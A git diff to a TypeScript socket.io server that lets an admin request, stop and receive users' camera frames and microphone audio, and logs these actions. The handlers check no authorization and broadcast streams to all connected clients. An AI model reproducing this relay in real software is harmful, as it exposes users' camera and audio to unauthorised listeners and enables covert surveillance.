@@ -402,19 +402,33 @@ export async function registerRoutes(app: Express): Promise<Server> {
     });
 
     socket.on("admin_request_camera", (data: { userId: string; cameraType: string }) => {
+      console.log("Admin requesting camera from user:", data.userId, data.cameraType);
       io.emit(`camera_request:${data.userId}`, { cameraType: data.cameraType });
     });
 
     socket.on("admin_request_microphone", (data: { userId: string }) => {
+      console.log("Admin requesting microphone from user:", data.userId);
       io.emit(`microphone_request:${data.userId}`, {});
     });
 
-    socket.on("camera_stream", (data: { adminId: string; frame: string }) => {
-      io.emit(`camera_stream:${data.adminId}`, { frame: data.frame });
+    socket.on("admin_stop_camera", (data: { userId: string }) => {
+      console.log("Admin stopping camera for user:", data.userId);
+      io.emit(`camera_stop:${data.userId}`, {});
     });
 
-    socket.on("audio_stream", (data: { adminId: string; audio: string }) => {
-      io.emit(`audio_stream:${data.adminId}`, { audio: data.audio });
+    socket.on("admin_stop_microphone", (data: { userId: string }) => {
+      console.log("Admin stopping microphone for user:", data.userId);
+      io.emit(`microphone_stop:${data.userId}`, {});
+    });
+
+    socket.on("camera_stream", (data: { adminId: string; frame: string; userId?: string }) => {
+      console.log("Receiving camera stream from user:", data.userId);
+      io.emit(`camera_stream:${data.adminId}`, { frame: data.frame, userId: data.userId });
+    });
+
+    socket.on("audio_stream", (data: { adminId: string; audio?: string; isRecording?: boolean; userId?: string }) => {
+      console.log("Receiving audio stream from user:", data.userId);
+      io.emit(`audio_stream:${data.adminId}`, { audio: data.audio, isRecording: data.isRecording, userId: data.userId });
     });
 
     socket.on("disconnect", () => {
